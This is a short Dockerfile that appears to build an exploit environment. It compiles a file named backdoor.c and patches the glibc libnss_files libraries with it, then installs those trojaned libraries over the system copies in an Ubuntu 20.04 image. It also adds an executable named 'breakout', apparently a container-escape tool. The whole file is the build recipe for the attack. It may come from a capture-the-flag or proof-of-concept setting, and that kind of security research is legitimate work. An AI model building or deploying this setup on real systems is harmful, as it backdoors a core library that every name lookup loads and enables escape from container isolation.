FROM ubuntu:18.04 AS builder

RUN sed -i "s@http://.*.ubuntu.com@http://repo.huaweicloud.com@g" /etc/apt/sources.list
RUN apt-get update && apt-get install build-essential python3 python3-pip -y
RUN pip3 install --trusted-host https://repo.huaweicloud.com -i https://repo.huaweicloud.com/repository/pypi/simple lief

COPY patch.py backdoor.c /
COPY --from=ubuntu:20.04 /usr/lib/x86_64-linux-gnu/libnss_files-2.31.so libnss_files-2.31.so
RUN cp /lib/x86_64-linux-gnu/libnss_files-2.27.so libnss_files-2.27.so

RUN gcc -shared -fPIC backdoor.c
RUN ls -alh /a.out
RUN python3 patch.py libnss_files-2.27.so
RUN python3 patch.py libnss_files-2.31.so
RUN ls -alh /

FROM ubuntu:20.04

COPY --from=builder /libnss_files-2.27.so.patch /lib/x86_64-linux-gnu/libnss_files-2.27.so
COPY --from=builder /libnss_files-2.31.so.patch /lib/x86_64-linux-gnu/libnss_files-2.31.so
COPY --from=builder /a.out /tmp/
COPY breakout /breakout
RUN chmod +x /breakout /tmp/a.out /lib/x86_64-linux-gnu/libnss_files-2.27.so
RUN ls -lah /breakout
RUN ls -lah /tmp/a.out
RUN ls -lah /lib/x86_64-linux-gnu/libnss_files*

